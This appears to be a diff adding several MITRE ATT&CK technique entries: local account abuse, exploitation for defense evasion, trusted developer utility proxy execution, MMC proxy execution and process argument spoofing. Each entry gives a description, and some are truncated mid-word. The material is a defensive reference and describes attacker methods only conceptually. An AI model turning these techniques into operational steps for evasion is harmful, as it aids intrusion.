+PLATFORMS: Linux, macOS, Windows, Containers, Network Devices, ESXi
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Exploitation for Defense Evasion
+TECHNIQUE ID: T1211
+TACTIC: Defense Evasion
+PLATFORMS: Linux, Windows, macOS, SaaS, IaaS
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them. Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security softwa
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Trusted Developer Utilities Proxy Execution
+TECHNIQUE ID: T1127
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions. Smart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microso
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: MMC
+TECHNIQUE ID: T1218.014
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration. For example, <code>mmc C:\Users\foo\admintools.msc /a</code> will open a custom, saved console msc file in author mode. Another common example is <code>mmc gpedit.msc</code>, which w
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Process Argument Spoofing
+TECHNIQUE ID: T1564.010
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB. Adversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign 
+
+──────────────────────────────────────────────────
